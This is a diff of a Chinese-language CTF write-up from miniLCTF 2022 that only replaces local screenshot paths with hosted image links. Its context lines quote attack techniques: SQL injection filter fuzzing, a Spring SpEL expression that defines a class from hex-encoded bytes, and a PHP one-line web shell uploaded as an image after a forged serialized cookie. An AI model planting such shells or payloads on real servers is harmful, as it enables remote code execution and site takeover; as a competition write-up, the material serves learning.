@@ -1510,7 +1510,7 @@ miniLctf{l3m0n_1s_s0_s0urrR77RrrR7}
 
 首先 fuzz 一下，
 
-![image-20220508154601107](C:\Users\hhh\AppData\Roaming\Typora\typora-user-images\image-20220508154601107.png)
+![image-20220508154601107](https://pic.imgdb.cn/item/6277e56e0947543129bbd871.png)
 
 union,select 均被过滤，双写，大小写，试了很多绕过均没用，但转移符`\`和`||`还在,得到
 
@@ -1607,7 +1607,7 @@ public static void main(String[] args) throws IOException {
 T(org.springframework.cglib.core.ReflectUtils).defineClass("demo",T(com.sun.org.apache.xerces.internal.impl.dv.util.HexBin).decode("十六进制编码"),T(org.springframework.util.ClassUtils).getDefaultClassLoader())
 ```
 
-![image-20220505020711773](D:\Program Files\Typora\img\image-20220505020711773.png)
+![image-20220505020711773](https://pic.imgdb.cn/item/6277e6260947543129bef21f.png)
 
 参考文章：https://forum.butian.net/share/1385
 
@@ -1657,13 +1657,13 @@ print ("反转后的 cipher：" + xor_cipher)
 
 拿到题首先上传一个图片马`<?php @eval($_POST['shell']); echo"luck"; ?>`，然后抓包。
 
-![image-20220508001057471](C:\Users\hhh\AppData\Roaming\Typora\typora-user-images\image-20220508001057471.png)
+![image-20220508001057471](https://pic.imgdb.cn/item/6277e60b0947543129be9d8e.png)
 
 发现有一个 Cookie 值,试着 base64 解密得到`O:4:"user":1:{s:9:"usergroup";s:7:"Tourist";}`,根据页面回显将 user 值改为加密过的`O:4:"user":1:{s:9:"usergroup";s:5:"Lteam";}`,并把.jpg 改为.php.
 
 上传成功，得到路径。访问并且页面返回了 luck，再用蚁剑连接得到 flag。
 
-![image-20220508002728324](C:\Users\hhh\AppData\Roaming\Typora\typora-user-images\image-20220508002728324.png)
+![image-20220508002728324](https://pic.imgdb.cn/item/6277e5ed0947543129be211b.png)
 
 ---
 
